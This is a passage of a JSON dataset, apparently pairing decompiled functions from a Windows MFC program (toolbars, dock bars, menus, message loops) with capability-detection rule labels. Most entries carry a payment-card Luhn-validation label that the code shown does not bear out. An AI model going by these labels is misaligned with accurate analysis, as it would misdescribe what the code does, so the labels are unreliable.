    "0042cdb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cdb2(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    (**(*in_ECX + 0x13c))(&var_10h, in_ECX[0x1f] & 0xa000);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 191
    },
    "0042ce39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0042ce39(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00409834(param_1);\n    return -(0xffff < uVar1) & uVar1;\n}\n",
        "token_count": 57
    },
    "0042d09f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042d09f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDockBar.0;\n    iVar3 = 0;\n    pcVar1 = extraout_ECX[0x27];\n    *(unaff_EBP + -4) = 1;\n    if (0 < pcVar1) {\n        do {\n            iVar2 = fcn.0042ce39();\n            if ((iVar2 != 0) && (*(iVar2 + 0x88) == extraout_ECX)) {\n                *(iVar2 + 0x88) = 0;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < extraout_ECX[0x27]);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0041b2bd();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042bd71();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 335
    },
    "0042e2f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0042e2f7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    piVar1 = fcn.0041bc88(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.004033b0(*(unaff_EBP + 0xc));\n    if (iVar2 == 0) {\n        fcn.00401180();\n    }\n    else {\n        fcn.0042e1f8(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        fcn.00401180();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 344
    },
    "0042f4ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f4ff(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack48;\n    uchar auStack28 [28];\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        uStack48 = 0;\n        iVar2 = (*pcVar1)(&stack0xffffffe4, 0, 0xf, 0xf);\n        if (iVar2 == 0) {\n            *(param_1 + 0x70) = *(*(param_1 + 0x68) + 0x80);\n            *(param_1 + 0x78) = *(*(param_1 + 0x68) + 0x7c) & 0xf000;\n            (*_sym.imp.USER32.dll_SetRectEmpty)(param_1 + 0xc);\n            *(param_1 + 0x20) = 0;\n            *(param_1 + 0x1c) = 0;\n            *(param_1 + 0x24) = 0;\n            *(param_1 + 0x7c) = 0;\n            *(param_1 + 0x80) = 0;\n            uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            iVar2 = fcn.0041eeb7(uVar3);\n            iVar4 = (*_sym.imp.USER32.dll_LockWindowUpdate)(*(iVar2 + 0x1c));\n            if (iVar4 == 0) {\n                uVar3 = 3;\n            }\n            else {\n                uVar3 = 0x403;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetDCEx)(*(iVar2 + 0x1c), 0, uVar3);\n            uVar3 = fcn.0042627a(uVar3);\n            *(param_1 + 0x84) = uVar3;\n            return;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xffffffd0, 0, 0xf, 0xf);\n        if (iVar2 == 0) break;\n        uStack48 = 0x42f537;\n        (*_sym.imp.USER32.dll_DispatchMessageA)();\n    }\n    return;\n}\n",
        "token_count": 530
    },
    "0042f924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f924(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.0042f5bb(1);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    uVar2 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    iVar3 = fcn.0041eeb7(uVar2);\n    (*_sym.imp.USER32.dll_LockWindowUpdate)(0);\n    iVar1 = *(param_1 + 0x84);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(iVar3 + 0x1c), *(iVar1 + 4));\n        *(param_1 + 0x84) = 0;\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "0043015a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043015a(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    \n    for (pcVar1 = param_3 + param_1; (pcVar1 < param_2 + param_1 && (*pcVar1 != '\\r')); pcVar1 = pcVar1 + 1) {\n    }\n    return pcVar1 - param_1;\n}\n",
        "token_count": 102
    },
    "00430c93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430c93(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    int32_t lParam;\n    int32_t wParam;\n    \n    lParam = in_ECX;\n    wParam = in_ECX;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0xb0, &wParam, &lParam);\n    iVar1 = fcn.004306e8();\n    iVar2 = fcn.0043015a(iVar1, lParam, wParam);\n    iVar2 = iVar2 - wParam;\n    arg_8h_00 = fcn.004026d0(iVar2);\n    fcn.0040b7b0(arg_8h_00, iVar1 + wParam, iVar2);\n    fcn.00407fe0(iVar2);\n    fcn.00430762();\n    return;\n}\n",
        "token_count": 220
    },
    "0043319e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043319e(uint param_1)\n\n{\n    fcn.00434fe8();\n    fcn.00437973(0x434fa8);\n    fcn.00437663(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "004331c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004331c2(uint param_1)\n\n{\n    fcn.00434fe8();\n    fcn.00437973(0x434fa8);\n    fcn.00437676(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "0043368d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fch\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: lpmi\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_9ch_2\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_68h_2\n// WARNING: Variable defined which should be unmapped: hmenu\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: dy\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h_2\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_18h_2\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_4h_2\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: item\n// WARNING: Variable defined which should be unmapped: var_10h_2\n\nuint __cdecl\nfcn.0043368d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, uint noname_79, \n            uint noname_80, uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint noname_85, \n            uint noname_86, uint noname_87, uint noname_88, uint noname_89, uint noname_90, uint noname_91, \n            uint noname_92, uint noname_93, uint noname_94, uint noname_95, uint noname_96, uint noname_97, \n            uint noname_98, uint noname_99, uint noname_100, uint noname_101, uint noname_102, uint noname_103, \n            uint noname_104, uint noname_105, uint noname_106, uint noname_107, uint noname_108, uint noname_109, \n            uint noname_110, uint noname_111, uint noname_112, uint noname_113, uint noname_114, uint noname_115, \n            uint noname_116, uint noname_117, uint noname_118, uint noname_119, uint noname_120, uint arg_8h, uint hWnd)\n\n{\n    uint *noname_1_00;\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_7_00;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    code **ppcVar8;\n    uint extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar9;\n    uint unaff_EDI;\n    uint32_t uVar10;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_8h;\n    uint item;\n    uint var_10h_2;\n    uint var_168h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_13ch;\n    uint lprcDst;\n    uint lprcSrc2;\n    uint var_cch;\n    uint var_9ch;\n    uint lprcSrc1;\n    uint var_70h;\n    uint var_68h;\n    uint var_48h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint noname_3_00;\n    uint noname_4_00;\n    uint noname_5_00;\n    char *noname_10_00;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    uint in_stack_fffffee0;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint var_fch;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint var_ech;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint lpmi;\n    uint var_c8h;\n    uint var_c4h;\n    uint in_stack_ffffff3c;\n    uint var_bch;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint var_ach;\n    uint var_a8h;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint var_9ch_2;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint var_88h;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint var_7ch;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint var_68h_2;\n    uint hmenu;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint lprc;\n    uint dy;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h_2;\n    uint var_44h;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint var_38h;\n    uint var_34h_2;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h_2;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    uint in_stack_fffffff4;\n    uint var_4h_2;\n    uint noname_97_00;\n    \n    noname_97_00 = 0x433697;\n    fcn.0040bb7c();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    piVar2 = fcn.0041bc88();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar3 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    noname_10_00 = \"ReBarWindow32\";\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    iVar4 = iVar4 + 1;\n    iVar3 = iVar4;\n    noname_7_00 = fcn.004026d0();\n    noname_1_00 = *(unaff_EBP + 0xc);\n    uVar7 = *noname_1_00;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    noname_5_00 = 0xffffffff;\n    fcn.00407fe0();\n    noname_4_00 = *noname_1_00;\n    iVar5 = fcn.0041eede();\n    *(unaff_EBP + 0xc) = iVar5;\n    iVar6 = fcn.0040c688(*(unaff_EBP + -0x10), \"ReBarWindow32\");\n    if ((iVar6 == 0) && (iVar5 != 0)) {\n        noname_3_00 = 0x442814;\n        iVar6 = fcn.0041bb59();\n        if (iVar6 != 0) {\n            iVar6 = fcn.0041f838();\n            if ((iVar6 != 0) && (*(unaff_EBP + -0x14) != iVar6)) {\n                uVar7 = fcn.0043368d(*(unaff_EBP + 8), noname_1_00, *(unaff_EBP + 0x10), noname_3_00, noname_4_00, \n                                     noname_5_00, uVar7, noname_7_00, iVar4, iVar3, noname_10_00, unaff_EDI, unaff_ESI, \n                                     unaff_EBX, in_stack_fffffeb0, in_stack_fffffeb4, in_stack_fffffeb8, \n                                     in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, \n                                     in_stack_fffffecc, in_stack_fffffed0, in_stack_fffffed4, in_stack_fffffed8, \n                                     in_stack_fffffedc, in_stack_fffffee0, in_stack_fffffee4, in_stack_fffffee8, \n                                     in_stack_fffffeec, in_stack_fffffef0, in_stack_fffffef4, in_stack_fffffef8, \n                                     in_stack_fffffefc, var_fch, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c\n                                     , var_ech, in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, \n                                     in_stack_ffffff20, in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, lpmi, \n                                     var_c8h, var_c4h, in_stack_ffffff3c, var_bch, in_stack_ffffff44, in_stack_ffffff48\n                                     , in_stack_ffffff4c, var_ach, var_a8h, in_stack_ffffff58, in_stack_ffffff5c, \n                                     var_9ch_2, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, \n                                     in_stack_ffffff70, var_88h, in_stack_ffffff78, in_stack_ffffff7c, var_7ch, \n                                     in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                     var_68h_2, hmenu, in_stack_ffffff9c, in_stack_ffffffa0, lprc, dy, var_50h, var_4ch\n                                     , var_48h_2, var_44h, in_stack_ffffffbc, in_stack_ffffffc0, var_38h, var_34h_2, \n                                     var_30h, var_2ch, var_28h_2, var_24h_2, var_20h, var_1ch_2, var_18h_2, var_14h_2, \n                                     in_stack_ffffffec, in_stack_fffffff0, in_stack_fffffff4, var_4h_2, noname_97_00, \n                                     unaff_retaddr, var_8h, item, var_10h_2, noname_3, noname_4, noname_5, noname_6, \n                                     noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, noname_13, noname_14\n                                     , noname_15, noname_16, noname_17, noname_18, noname_19, noname_20, noname_21, \n                                     noname_22, noname_23);\n                goto code_r0x00433b6d;\n            }\n            fcn.00423649();\n            *(unaff_EBP + -4) = 1;\n            piVar2 = fcn.0041bc88();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + 8) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 2;\n            piVar2 = fcn.0041bc88();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x18) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 3;\n            fcn.00425f52();\n            *(unaff_EBP + -4) = 4;\n            fcn.00426309(*(unaff_EBP + -0x14));\n            pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n            *(unaff_EBP + -4) = 5;\n            *(unaff_EBP + -0x15c) = 0x50;\n            *(unaff_EBP + -0x158) = 0x10;\n            (*pcVar1)();\n            (*pcVar1)(*(iVar5 + 0x1c), 0x409, noname_1_00[3], unaff_EBP + -0x78);\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(\"ToolbarWindow32\");\n            uVar7 = fcn.004026d0(iVar3 + 1, iVar3 + 1);\n            (*_sym.imp.USER32.dll_GetClassNameA)(*(unaff_EBP + -0x13c), uVar7);\n            fcn.00407fe0();\n            uVar7 = fcn.0041eede();\n            *(unaff_EBP + -0x28) = uVar7;\n            iVar3 = fcn.0040c688(*(unaff_EBP + -0x10), \"ToolbarWindow32\");\n            if ((iVar3 == 0) && (iVar3 = *(unaff_EBP + -0x28),  iVar3 != 0)) {\n                iVar4 = fcn.0041bb59();\n                if (iVar4 != 0) {\n                    *(unaff_EBP + -0x70) = noname_1_00[6];\n                    *(unaff_EBP + -0x34) = noname_1_00 + 6;\n                    fcn.004261c2();\n                    fcn.00426186();\n                    iVar4 = fcn.00409707();\n                    *(unaff_EBP + -0x1c) = iVar4;\n                    do {\n                        iVar4 = iVar4 + -1;\n                        uVar7 = *(iVar3 + 0x1c);\n                        *(unaff_EBP + 0xc) = iVar4;\n                        (*pcVar1)(uVar7, 0x41d, iVar4, unaff_EBP + -0xdc);\n                        iVar5 = (*_sym.imp.USER32.dll_IntersectRect)\n                                          (unaff_EBP + -0x10c, unaff_EBP + -0x78, unaff_EBP + -0xdc);\n                        if (iVar5 != 0) break;\n                    } while (iVar4 != 0);\n                    fcn.0040bbe0(unaff_EBP + -0xcc, 0, 0x30);\n                    *(unaff_EBP + -0xcc) = 0x30;\n                    iVar4 = fcn.00409741();\n                    iVar3 = *(unaff_EBP + -0x1c);\n                    uVar10 = *(unaff_EBP + 0xc);\n                    fcn.0040a2a0();\n                    *(unaff_EBP + -0x24) = &stack0xfffffe70;\n                    uVar9 = 0;\n                    fcn.0040bbe0(*(unaff_EBP + -0x24), 0, (iVar3 - uVar10) * 4);\n                    uVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    fcn.004235dc(uVar7);\n                    fcn.00409683(unaff_EBP + -0x9c);\n                    pcVar1 = _sym.imp.USER32.dll_CopyRect;\n                    *(unaff_EBP + -0x20) = 0;\n                    if (uVar10 < *(unaff_EBP + -0x1c)) {\n                        do {\n                            fcn.00427ed2(*(unaff_EBP + 0xc), unaff_EBP + -0x30, unaff_EBP + -0x38, unaff_EBP + -0x2c);\n                            if ((*(unaff_EBP + -0x38) & 1) == 0) {\n                                *(unaff_EBP + -200) = 0x162;\n                                fcn.004033b0(*(unaff_EBP + -0x30));\n                                fcn.0041bc06(unaff_EBP + -0x18, *(unaff_EBP + 8), 1, 10);\n                                ppcVar8 = fcn.0041bab6(8);\n                                if (ppcVar8 == NULL) {\n                                    ppcVar8 = NULL;\n                                }\n                                else {\n                                    ppcVar8[1] = NULL;\n                                    *ppcVar8 = vtable.CBitmap.0;\n                                }\n                                piVar2 = *(unaff_EBP + -0x24) + uVar9 * 4;\n                                *piVar2 = ppcVar8;\n                                (*_sym.imp.COMCTL32.dll_ImageList_GetImageInfo)\n                                          (*(iVar4 + 4), *(unaff_EBP + -0x2c), unaff_EBP + -0xfc);\n                                (*pcVar1)(unaff_EBP + -0x58, unaff_EBP + -0xec);\n                                (*_sym.imp.USER32.dll_OffsetRect)\n                                          (unaff_EBP + -0x58, -*(unaff_EBP + -0x58), -*(unaff_EBP + -0x54));\n                                fcn.0040965f(unaff_EBP + -0x9c, *(unaff_EBP + -0x50), *(unaff_EBP + -0x4c));\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.004265f8(*(unaff_EBP + -0x44), iVar3);\n                                *piVar2 = iVar3;\n                                (*_sym.imp.USER32.dll_GetSysColor)(4);\n                                fcn.00434219();\n                                fcn.0040971a(unaff_EBP + -0x48, *(unaff_EBP + -0x2c), 0, 0, 1);\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.004265f8(*(unaff_EBP + -0x44), iVar3);\n                                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                                *piVar2 = iVar3;\n                                *(unaff_EBP + -0xa8) = *(unaff_EBP + -0x18);\n                                *(unaff_EBP + -0xbc) = *(unaff_EBP + -0x30);\n                                *(unaff_EBP + -0xc4) = 0x100;\n                                uVar9 = *(unaff_EBP + -0x20);\n                                *(unaff_EBP + -0xac) = *piVar2;\ncode_r0x00433a74:\n                                (*_sym.imp.USER32.dll_InsertMenuItemA)\n                                          (*(unaff_EBP + -100), *(unaff_EBP + 0xc), 1, unaff_EBP + -0xcc);\n                            }\n                            else if (uVar9 != 0) {\n                                *(unaff_EBP + -200) = 0x100;\n                                *(unaff_EBP + -0xc4) = 0x800;\n                                goto code_r0x00433a74;\n                            }\n                            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n                        } while (*(unaff_EBP + 0xc) < *(unaff_EBP + -0x1c));\n                    }\n                    (*pcVar1)(unaff_EBP + -0x88, *(unaff_EBP + -0x34));\n                    fcn.004261c2();\n                    fcn.0041e52a(0, *(unaff_EBP + -0x88), *(unaff_EBP + -0x7c), *(unaff_EBP + -0x14), 0);\n                    uVar10 = 0;\n                    **(unaff_EBP + 0x10) = 0;\n                    if (uVar9 != 0) {\n                        do {\n                            piVar2 = *(*(unaff_EBP + -0x24) + uVar10 * 4);\n                            if (piVar2 != NULL) {\n                                (**(*piVar2 + 4))();\n                            }\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < uVar9);\n                    }\n                    *(unaff_EBP + -4) = 4;\n                    fcn.00426364();\n                    *(unaff_EBP + -4) = 3;\n                    fcn.004262f0();\n                    fcn.00401180();\n                    fcn.00401180();\n                    *(unaff_EBP + -4) = 0;\n                    fcn.00432fbb();\n                    uVar7 = 1;\n                    goto code_r0x00433b6d;\n                }\n            }\n            *(unaff_EBP + -4) = 4;\n            fcn.00426364();\n            *(unaff_EBP + -4) = 3;\n            fcn.004262f0();\n            fcn.00401180();\n            fcn.00401180();\n            *(unaff_EBP + -4) = 0;\n            fcn.00432fbb();\n        }\n    }\n    uVar7 = 0;\ncode_r0x00433b6d:\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar7;\n}\n",
        "token_count": 5851
    },
    "00433c3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: ARG_0\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.00433c3b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint ARG_0;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = *0x44e0fc;\n    piVar1 = fcn.0041bc88();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x34) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0041cced();\n    if ((uVar3 & 0x4000) == 0) {\n        fcn.00434c2a(extraout_ECX + 0xc0);\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00406c20(0x440ae4);\n            fcn.00406c20(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x440ae8, *(extraout_ECX + 0x54));\n                fcn.00406c20(unaff_EBP + -0x30);\n            }\n        }\n    }\n    else {\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00406c20(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x440ae8, *(extraout_ECX + 0x54));\n                fcn.00406c20(unaff_EBP + -0x30);\n            }\n            fcn.00406c20(0x440ae4);\n        }\n        fcn.00434c2a();\n    }\n    fcn.00426d35(*(extraout_ECX + 0x1c), *(unaff_EBP + -0x34));\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 617
    },
    "00433e62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433e62(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (arg_ch == 0) {\n        puVar3 = 0x441608;\n        do {\n            iVar2 = fcn.004329b1(*puVar3);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x1c), 0xffffffff);\n                iVar2 = fcn.0042cdfc(uVar1);\n                if (0 < iVar2) break;\n            }\n            if (((puVar3[1] ^ *(arg_8h + 0x7c)) & 0xf000) == 0) {\n                fcn.004329b1(*puVar3);\n            }\n            puVar3 = puVar3 + 2;\n        } while (puVar3 < 0x441628);\n    }\n    fcn.0042dabb(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 261
    },
    "00433ee3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
